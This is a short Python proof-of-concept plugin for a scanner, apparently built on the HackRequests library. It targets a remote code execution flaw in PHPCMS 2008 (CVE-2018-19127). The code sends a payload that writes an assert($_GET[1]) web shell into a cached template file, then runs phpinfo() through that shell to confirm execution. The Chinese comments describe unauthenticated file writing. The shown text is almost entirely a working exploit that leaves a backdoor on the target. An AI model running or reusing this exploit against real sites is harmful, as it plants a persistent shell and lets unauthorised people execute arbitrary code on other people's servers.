# Author:w8ay
# Name:phpcms 2008 rce
'''
referer: https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
description: 攻击者利用该漏洞，可在未授权的情况下实现对网站文件的写入。该漏洞危害程度为高危(High)。目前，漏洞利用原理已公开，厂商已发布新版本修复此漏洞。
'''
import HackRequests

def poc(arg, **kwargs):
    payload = r'''/type.php?template=tag_(){};@unlink(FILE);assert($_GET[1]);{//../rss'''
    hh = HackRequests.http(arg + payload)
    shell_url = arg + '/data/cache_template/rss.tpl.php?1=phpinfo()'
    r = HackRequests.http(shell_url)
    if r.status_code == 200 and 'allow_url_fopen' in r.text():
        result = {
            "name": "phpcms_2008 rce",  # 插件名称
            "content": "攻击者利用该漏洞，可在未授权的情况下实现对网站文件的写入。该漏洞危害程度为高危(High)。",  # 插件返回内容详情，会造成什么后果。
            "url": shell_url,  # 漏洞存在url
            "log": hh.log,
            "tag": "rce"  # 漏洞标签
        }
        return result